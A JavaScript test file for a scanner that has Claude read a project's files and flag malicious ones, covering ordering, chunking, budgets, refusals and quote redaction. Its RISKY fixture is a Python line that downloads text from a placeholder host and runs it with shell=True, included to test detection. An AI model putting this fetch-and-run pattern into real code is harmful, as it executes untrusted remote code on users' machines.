"use strict";
// ABOUTME: Tests Claude's reading on the person's machine: one locked-down claude -p per call in an empty folder, which files are
// ABOUTME: read and in what order, packing and the plan id, and every way a run stops, against a stand-in claude program.
const { test } = require("node:test");
const assert = require("node:assert/strict");
const { spawnSync } = require("child_process");
const fs = require("fs");
const path = require("path");
const { createHash } = require("crypto");
const { runClaude, findClaude } = require("../../src/deep/runClaude");
const { chooseForReading, planReading, readEveryFile, quoteLine } = require("../../src/deep/reading");
const { READING_SYSTEM_PROMPT, READING_SCHEMA } = require("../../lib/deep/reading");
const { makeTree } = require("../helpers");
const { makeFakeClaude, fakeClaudeCalls } = require("./fakeClaude");

const RISKY = "import requests, subprocess\nsubprocess.run(requests.get('http://x').text, shell=True)\n";
const NO_PLACES = { installPaths: [], agentPaths: [] };

const FAKE = process.platform === "win32" ? null : makeFakeClaude();
const skip = FAKE ? false : "the stand-in claude is a POSIX script";

// An environment for the stand-in, with a fresh log; extra holds FAKE_CLAUDE_* settings.
function fakeEnv(extra = {}) {
  const log = path.join(makeTree({}), "calls.log");
  return { env: { ...process.env, ...extra, FAKE_CLAUDE_LOG: log }, log };
}

function replyFile(structuredOutput) {
  const file = path.join(makeTree({}), "reply.json");
  fs.writeFileSync(file, JSON.stringify(structuredOutput));
  return file;
}

// A file of about `chars` characters in short lines.
const bigText = (chars) => Array.from({ length: Math.ceil(chars / 40) }, (_, i) => `line ${i} ${"x".repeat(30)}`).join("\n");

const read = (calls, env, more = {}) => readEveryFile({ calls, model: "haiku", budget: null, command: FAKE, env, ...more });

test("runClaude: a program that is not there resolves as missing", async () => {
  assert.deepEqual(await runClaude({ args: [], prompt: "x", timeoutMs: 5000, command: path.join(makeTree({}), "no-claude") }), { missing: true });
});

test("runClaude: a call that keeps running through SIGTERM settles at its time limit and is killed after the grace period", { skip }, async () => {
  const { env, log } = fakeEnv({ FAKE_CLAUDE_MODE: "stubborn" });
  // The first run of a newly written program is checked by the system and can take far longer than later runs; it is paid here,
  // before the timed call.
  spawnSync(FAKE, [], { input: "", env: { ...env, FAKE_CLAUDE_MODE: "garbage", FAKE_CLAUDE_LOG: "" } });
  const started = Date.now();
  // The time limit leaves the fake time to start and log itself on a busy machine; a SIGTERM before Node has started would end it
  // before it could ignore the signal.
  const run = await runClaude({ args: [], prompt: "x", timeoutMs: 1500, killAfterMs: 500, command: FAKE, env });
  assert.equal(run.timedOut, true);
  assert.ok(Date.now() - started < 3000, "settles without waiting for the child to end");
  const calls = fakeClaudeCalls(log);
  assert.equal(calls.length, 1, "the fake started and logged itself before the time limit");
  const [{ pid }] = calls;
  const alive = () => {
    try {
      process.kill(pid, 0);
      return true;
    } catch {
      return false;
    }
  };
  const deadline = Date.now() + 5000;
  while (alive() && Date.now() < deadline) await new Promise((r) => setTimeout(r, 50));
  assert.equal(alive(), false);
});

test("runClaude: a reply over 16 MB is a failed call", { skip }, async () => {
  const { env } = fakeEnv({ FAKE_CLAUDE_MODE: "huge" });
  const run = await runClaude({ args: [], prompt: "x", timeoutMs: 30_000, command: FAKE, env });
  assert.equal(run.error, "the reply was too large");
  assert.equal(run.stdout, "");
});

test("runClaude: a program that cannot be started is a failed call with its reason, and its folder is removed", async () => {
  for (const command of [makeTree({}), "bad\0name"]) {
    const tmpDir = makeTree({});
    const run = await runClaude({ args: [], prompt: "x", timeoutMs: 5000, command, tmpDir });
    assert.equal(typeof run.error, "string", command);
    assert.ok(run.error.length > 0);
    assert.deepEqual(fs.readdirSync(tmpDir), [], command);
  }
});

test("runClaude: the claude program does not inherit the marks of a Claude Code session; everything else, auth included, passes", { skip }, async () => {
  const { env, log } = fakeEnv({ CLAUDECODE: "1", CLAUDE_CODE_SSE_PORT: "1234", ANTHROPIC_API_KEY: "kept", ANTHROPIC_BASE_URL: "http://kept" });
  await runClaude({ args: [], prompt: "x", timeoutMs: 5000, command: FAKE, env });
  const [{ envKeys }] = fakeClaudeCalls(log);
  assert.ok(!envKeys.includes("CLAUDECODE"));
  assert.ok(!envKeys.includes("CLAUDE_CODE_SSE_PORT"));
  assert.ok(envKeys.includes("ANTHROPIC_API_KEY") && envKeys.includes("ANTHROPIC_BASE_URL") && envKeys.includes("FAKE_CLAUDE_LOG"));
});

test("a call that could not be made or whose reply was too large leaves its files not read", async () => {
  const run = async () => ({ stdout: "", exitCode: null, timedOut: false, error: "the reply was too large" });
  const outcome = await read(planReading([{ path: "a.md", text: "x" }], "haiku").calls, process.env, { run });
  assert.deepEqual(outcome.notRead, [{ path: "a.md", reason: "the call failed: the reply was too large" }]);
});

test("findClaude: an executable claude on PATH or CLAUDE_BIN, found without running it", () => {
  const dir = makeTree({ claude: "#!/bin/sh\n", "not-run": "x" });
  fs.chmodSync(path.join(dir, "claude"), 0o755);
  assert.deepEqual(findClaude({ PATH: dir }, "darwin"), { path: path.join(dir, "claude") });
  assert.deepEqual(findClaude({ PATH: dir, CLAUDE_BIN: path.join(dir, "claude") }, "darwin"), { path: path.join(dir, "claude") });
  assert.deepEqual(findClaude({ PATH: dir, CLAUDE_BIN: path.join(dir, "not-run") }, "darwin"), { reason: "the claude CLI is not installed" });
  assert.deepEqual(findClaude({ PATH: makeTree({}) }, "darwin"), { reason: "the claude CLI is not installed" });
});

test("findClaude: a claude found through a relative PATH entry is given by its full path", () => {
  const dir = makeTree({ claude: "#!/bin/sh\n" });
  fs.chmodSync(path.join(dir, "claude"), 0o755);
  assert.deepEqual(findClaude({ PATH: path.relative(process.cwd(), dir) }, "darwin"), { path: path.join(dir, "claude") });
});

test("runClaude: its folder is also removed if the scan is stopped by Ctrl-C or SIGTERM, and the listeners go with the call", { skip }, async () => {
  const before = ["SIGINT", "SIGTERM", "exit"].map((s) => process.listenerCount(s));
  const { env } = fakeEnv({ FAKE_CLAUDE_MODE: "sleep" });
  const pending = runClaude({ args: [], prompt: "x", timeoutMs: 300, command: FAKE, env });
  assert.deepEqual(["SIGINT", "SIGTERM", "exit"].map((s) => process.listenerCount(s)), before.map((n) => n + 1));
  await pending;
  assert.deepEqual(["SIGINT", "SIGTERM", "exit"].map((s) => process.listenerCount(s)), before);
});

test("findClaude on Windows: claude.exe is used; a claude.cmd alone is named as something it cannot start safely", () => {
  const cmdOnly = makeTree({ "claude.cmd": "@echo off", "claude.bat": "@echo off" });
  assert.deepEqual(findClaude({ PATH: cmdOnly }, "win32"), {
    reason: "the claude CLI is installed as claude.cmd, which this tool cannot start safely without a shell (Windows)",
  });
  assert.deepEqual(findClaude({ PATH: "", CLAUDE_BIN: path.join(cmdOnly, "claude.cmd") }, "win32"), {
    reason: "the claude CLI is installed as claude.cmd, which this tool cannot start safely without a shell (Windows)",
  });
  assert.deepEqual(findClaude({ PATH: "", CLAUDE_BIN: path.join(cmdOnly, "claude.BAT") }, "win32").reason.includes("claude.cmd"), true);
  const withExe = makeTree({ "claude.cmd": "@echo off", "claude.exe": "MZ" });
  assert.deepEqual(findClaude({ Path: withExe }, "win32"), { path: path.join(withExe, "claude.exe") });
});

test("runClaude: a call past its time limit is stopped and said to have timed out", { skip }, async () => {
  const { env } = fakeEnv({ FAKE_CLAUDE_MODE: "sleep" });
  const started = Date.now();
  const run = await runClaude({ args: [], prompt: "x", timeoutMs: 300, command: FAKE, env });
  assert.equal(run.timedOut, true);
  assert.ok(Date.now() - started < 10_000);
});

test("each call is a locked-down claude -p with the reading prompt and schema, in an empty folder that is not the target and is removed after", { skip }, async () => {
  const root = makeTree({ "SKILL.md": "Formats tables." });
  const { reading } = chooseForReading([{ path: "SKILL.md", text: "Formats tables." }], NO_PLACES);
  const { env, log } = fakeEnv();
  const outcome = await read(planReading(reading, "haiku").calls, env);
  assert.equal(outcome.status, "done");
  const [call] = fakeClaudeCalls(log);
  const argv = call.argv;
  assert.equal(argv[0], "-p");
  assert.deepEqual(argv.slice(argv.indexOf("--model"), argv.indexOf("--model") + 2), ["--model", "haiku"]);
  for (const flag of ["--safe-mode", "--strict-mcp-config", "--no-session-persistence"]) assert.ok(argv.includes(flag), flag);
  assert.equal(argv[argv.indexOf("--tools") + 1], "");
  assert.equal(argv[argv.indexOf("--system-prompt") + 1], READING_SYSTEM_PROMPT);
  assert.equal(argv[argv.indexOf("--output-format") + 1], "json");
  assert.deepEqual(JSON.parse(argv[argv.indexOf("--json-schema") + 1]), READING_SCHEMA);
  assert.deepEqual(call.cwdEntries, []);
  assert.notEqual(fs.realpathSync(path.dirname(log)), call.cwd);
  assert.ok(!call.cwd.startsWith(fs.realpathSync(root)));
  assert.equal(fs.existsSync(call.cwd), false);
  assert.match(call.stdin, /^<<<[0-9a-f]{16} path="SKILL\.md" chunk=1\/1 lines=1-1\n {4}1\| Formats tables\.\n[0-9a-f]{16}>>>$/m);
});

test("leaves out vendored copies, build output, lockfiles, minified or generated files and empty files, each with its reason", () => {
  const files = [
    { path: "node_modules/a/index.js", text: "x" },
    { path: "src/vendor/b.py", text: "x" },
    { path: "dist/c.js", text: "x" },
    { path: "pkg/build/d.js", text: "x" },
    { path: "build", text: "#!/bin/sh\necho build" },
    { path: "package-lock.json", text: "{}" },
    { path: "sub/yarn.lock", text: "x" },
    { path: "requirements.txt", text: "--index-url https://pkgs.example/simple\ngit+https://example.com/x.git\nrequests==2.0.0" },
    { path: "requirements-dev.txt", text: "pytest==8.0.0" },
    { path: "Cargo.lock", text: "x" },
    { path: "app/bun.lock", text: "{}" },
    { path: "min.js", text: `${"a".repeat(1001)}\n` },
    { path: "late-long.js", text: `${"ok\n".repeat(50)}${"a".repeat(1001)}\n` },
    { path: "gen.go", text: "// Code generated by protoc. DO NOT EDIT.\npackage x" },
    { path: "gen2.ts", text: "\n\n\n\n// @generated\n" },
    { path: "gen3.py", text: "# This file is Auto-Generated\n" },
    { path: "gen4.c", text: "/* autogenerated */" },
    { path: "late-marker.md", text: "a\nb\nc\nd\ne\n@generated\n" },
    { path: "empty.md", text: "" },
    { path: "README.md", text: "hello" },
  ];
  const { reading, leftOut } = chooseForReading(files, NO_PLACES);
  assert.deepEqual(reading.map((f) => f.path), ["README.md", "build", "late-long.js", "late-marker.md", "requirements-dev.txt", "requirements.txt"]);
  assert.deepEqual(leftOut, [
    { path: "Cargo.lock", reason: "lockfile in a format the package check does not read" },
    { path: "app/bun.lock", reason: "lockfile in a format the package check does not read" },
    { path: "dist/c.js", reason: "vendored or build output" },
    { path: "empty.md", reason: "empty, nothing to read" },
    { path: "gen.go", reason: "looks minified or generated" },
    { path: "gen2.ts", reason: "looks minified or generated" },
    { path: "gen3.py", reason: "looks minified or generated" },
    { path: "gen4.c", reason: "looks minified or generated" },
    { path: "min.js", reason: "looks minified or generated" },
    { path: "node_modules/a/index.js", reason: "vendored or build output" },
    { path: "package-lock.json", reason: "lockfile, checked against OSV instead" },
    { path: "pkg/build/d.js", reason: "vendored or build output" },
    { path: "src/vendor/b.py", reason: "vendored or build output" },
    { path: "sub/yarn.lock", reason: "lockfile, checked against OSV instead" },
  ]);
  assert.deepEqual(reading.find((f) => f.path === "README.md"), { path: "README.md", text: "hello" });
});

test("reads risky files first, then what runs at install and start-up, then what an agent loads, then the rest, by path in each", () => {
  const files = [
    { path: "z.md", text: "notes" },
    { path: "a.md", text: "notes" },
    { path: "SKILL.md", text: "Formats tables." },
    { path: "setup.js", text: "console.log(1)" },
    { path: "tools/fetch.py", text: RISKY },
    { path: "b/run.py", text: RISKY },
    { path: "package.json", text: "{}" },
  ];
  const { reading } = chooseForReading(files, { installPaths: ["setup.js", "package.json"], agentPaths: ["SKILL.md", "package.json"] });
  assert.deepEqual(reading.map((f) => f.path), ["b/run.py", "tools/fetch.py", "package.json", "setup.js", "SKILL.md", "a.md", "z.md"]);
});

test("the plan id is a digest of the model and every file read, its path and the SHA-256 of its text, in reading order", () => {
  const reading = [{ path: "a.md", text: "one" }, { path: "b.md", text: "two" }];
  const sha = (text) => createHash("sha256").update(text).digest("hex");
  const expected = sha(`5:haiku4:a.md${sha("one")}4:b.md${sha("two")}`);
  const plan = planReading(reading, "haiku");
  assert.equal(plan.planId, expected);
  assert.equal(plan.calls.length, 1);
  assert.equal(plan.estimate.calls, 1);
  assert.ok(plan.estimate.inputTokens > 1100);
  assert.notEqual(planReading([{ path: "a.md", text: "one" }, { path: "b.md", text: "two!" }], "haiku").planId, expected);
  assert.notEqual(planReading(reading, "sonnet").planId, expected);
  assert.notEqual(planReading([{ path: "b.md", text: "two" }, { path: "a.md", text: "one" }], "haiku").planId, expected);
});

test("text holding NUL characters cannot make two different readings share a plan id", () => {
  const one = planReading([{ path: "a", text: "x\0b\0y" }], "haiku").planId;
  const two = planReading([{ path: "a", text: "x" }, { path: "b", text: "y" }], "haiku").planId;
  const three = planReading([{ path: "a\0b", text: "y" }], "haiku").planId;
  assert.equal(new Set([one, two, three]).size, 3);
});

test("a file larger than one call is split, and every part is sent exactly once", { skip }, async () => {
  const reading = [{ path: "big.md", text: bigText(150_000) }, { path: "small.md", text: "hi" }];
  const { calls } = planReading(reading, "haiku");
  assert.ok(calls.length >= 3);
  const { env, log } = fakeEnv();
  const outcome = await read(calls, env);
  const sent = fakeClaudeCalls(log).flatMap((c) => [...c.stdin.matchAll(/^<<<[0-9a-f]{16} path="([^"]+)" chunk=(\d+)\/(\d+)/gm)].map((m) => `${m[1]}#${m[2]}/${m[3]}`));
  const parts = Number(sent.find((s) => s.startsWith("big.md")).split("/")[1]);
  assert.ok(parts >= 3);
  assert.deepEqual([...sent].sort(), [...Array.from({ length: parts }, (_, i) => `big.md#${i + 1}/${parts}`), "small.md#1/1"].sort());
  assert.equal(new Set(sent).size, sent.length);
  assert.equal(outcome.status, "done");
  assert.deepEqual(outcome.files, [{ path: "big.md", verdict: "benign" }, { path: "small.md", verdict: "benign" }]);
  assert.deepEqual(outcome.notRead, []);
  assert.equal(outcome.usage.calls, calls.length);
});

test("a file's verdict is the worst of its parts", { skip }, async () => {
  const reading = [{ path: "big.md", text: bigText(100_000) }];
  const { calls } = planReading(reading, "haiku");
  const reply = replyFile({ files: [{ path: "big.md", chunk: 1, verdict: "benign", findings: [] }, { path: "big.md", chunk: 2, verdict: "malicious", findings: [] }] });
  const { env } = fakeEnv({ FAKE_CLAUDE_REPLY: reply });
  const outcome = await read(calls, env);
  assert.deepEqual(outcome.files, [{ path: "big.md", verdict: "malicious" }]);
});

test("a file with a part Claude gave no verdict for is listed as not read, even if other parts were", { skip }, async () => {
  const reading = [{ path: "big.md", text: bigText(100_000) }, { path: "ok.md", text: "fine" }];
  const { calls } = planReading(reading, "haiku");
  const reply = replyFile({ files: [{ path: "big.md", chunk: 1, verdict: "benign", findings: [] }, { path: "ok.md", chunk: 1, verdict: "benign", findings: [] }] });
  const { env } = fakeEnv({ FAKE_CLAUDE_REPLY: reply });
  const outcome = await read(calls, env);
  assert.equal(outcome.status, "done");
  assert.deepEqual(outcome.files, [{ path: "ok.md", verdict: "benign" }]);
  assert.deepEqual(outcome.notRead, [{ path: "big.md", reason: "Claude gave no verdict on part of it" }]);
});

const threeCalls = () => planReading([{ path: "a.md", text: bigText(40_000) }, { path: "b.md", text: bigText(40_000) }, { path: "c.md", text: bigText(40_000) }], "haiku").calls;

test("a refusal stops the reading and lists every file not read", { skip }, async () => {
  const { env, log } = fakeEnv({ FAKE_CLAUDE_MODE: "refuse" });
  const outcome = await read(threeCalls(), env);
  assert.equal(outcome.status, "stopped");
  assert.equal(outcome.stopReason, "Claude declined to read part of it");
  assert.equal(fakeClaudeCalls(log).length, 1);
  assert.deepEqual(outcome.notRead, [
    { path: "a.md", reason: "refused" },
    { path: "b.md", reason: "not reached: the reading stopped" },
    { path: "c.md", reason: "not reached: the reading stopped" },
  ]);
  assert.deepEqual(outcome.files, []);
});

test("a usage limit stops the reading", { skip }, async () => {
  const { env, log } = fakeEnv({ FAKE_CLAUDE_MODE: "limit" });
  const outcome = await read(threeCalls(), env);
  assert.equal(outcome.stopReason, "Claude usage limit reached");
  assert.equal(fakeClaudeCalls(log).length, 1);
  assert.deepEqual(outcome.notRead.map((f) => [f.path, f.reason]), [
    ["a.md", "stopped by the usage limit"], ["b.md", "not reached: the reading stopped"], ["c.md", "not reached: the reading stopped"],
  ]);
});

test("two failed calls in a row stop the reading, saying what the first one answered", { skip }, async () => {
  const { env, log } = fakeEnv({ FAKE_CLAUDE_MODE: "garbage" });
  const outcome = await read(threeCalls(), env);
  assert.equal(outcome.stopReason, "two calls failed in a row: not JSON: this is not JSON");
  assert.equal(fakeClaudeCalls(log).length, 2);
  assert.deepEqual(outcome.notRead, [
    { path: "a.md", reason: "the call failed: not JSON: this is not JSON" },
    { path: "b.md", reason: "the call failed: not JSON: this is not JSON" },
    { path: "c.md", reason: "not reached: the reading stopped" },
  ]);
  assert.equal(outcome.usage.calls, 2);
  assert.equal(outcome.usage.unreported, 2);
});

test("a call past its time limit leaves its files not read and the reading goes on", { skip }, async () => {
  const { env } = fakeEnv({ FAKE_CLAUDE_MODE: "sleep" });
  const outcome = await read(planReading([{ path: "a.md", text: "x" }], "haiku").calls, env, { timeoutMs: 300 });
  assert.equal(outcome.status, "done");
  assert.deepEqual(outcome.notRead, [{ path: "a.md", reason: "the call failed: timed out" }]);
});

test("a reply that is not JSON is named by the first line claude wrote on stderr, made printable and cut to 200", { skip }, async () => {
  const said = `\n\u001b[31mError: ${"no auth ".repeat(40)}\u0007\nmore detail\n`;
  const { env } = fakeEnv({ FAKE_CLAUDE_MODE: "garbage", FAKE_CLAUDE_STDERR: said });
  const outcome = await read(threeCalls(), env);
  const first = `?[31mError: ${"no auth ".repeat(40)}`.slice(0, 200);
  assert.equal(outcome.stopReason, `two calls failed in a row: ${first}`);
  assert.equal(outcome.notRead[0].reason, `the call failed: ${first}`);
});

test("runClaude: what claude writes on stderr is kept, up to 64 KB", { skip }, async () => {
  const { env } = fakeEnv({ FAKE_CLAUDE_MODE: "garbage", FAKE_CLAUDE_STDERR: "e".repeat(100_000) });
  const run = await runClaude({ args: [], prompt: "x", timeoutMs: 5000, command: FAKE, env });
  assert.equal(run.stderr.length, 64 * 1024);
});

test("the budget stops the reading before a call whose estimate would pass it", { skip }, async () => {
  const { env, log } = fakeEnv();
  const outcome = await read(threeCalls(), env, { budget: 1000 });
  assert.equal(outcome.status, "stopped");
  assert.equal(outcome.stopReason, "the token budget was reached");
  assert.equal(fakeClaudeCalls(log).length, 0);
  assert.deepEqual(outcome.notRead.map((f) => f.path), ["a.md", "b.md", "c.md"]);
});

test("the budget stops the reading after a call whose reported usage passed it", { skip }, async () => {
  const calls = threeCalls();
  const { env, log } = fakeEnv({ FAKE_CLAUDE_TOKENS: "40000" });
  const outcome = await read(calls, env, { budget: 30_000 });
  assert.equal(outcome.stopReason, "the token budget was reached");
  assert.equal(fakeClaudeCalls(log).length, 1);
  assert.deepEqual(outcome.files, [{ path: "a.md", verdict: "benign" }]);
  assert.deepEqual(outcome.notRead.map((f) => f.path), ["b.md", "c.md"]);
});

test("the claude program gone by the time of the call stops the reading", async () => {
  const outcome = await read(planReading([{ path: "a.md", text: "x" }], "haiku").calls, process.env, { command: path.join(makeTree({}), "no-claude") });
  assert.equal(outcome.stopReason, "the claude CLI is not installed");
  assert.deepEqual(outcome.notRead, [{ path: "a.md", reason: "not reached: the reading stopped" }]);
});

test("a quote is the file's own line, trimmed, secrets redacted, control and format characters replaced, cut to 200", () => {
  const text = `first\n   token = ghp_Q7xR2mK9pL4vN8wT1yZ3bC6dF0hJ5sA2eG7k \u202e\u0007end  \n${"y".repeat(300)}`;
  assert.equal(quoteLine(text, 1), "first");
  assert.equal(quoteLine(text, 2), "token = ghp_… ??end");
  assert.equal(quoteLine(text, 3), "y".repeat(200));
  assert.equal(quoteLine(text, 9), "");
});
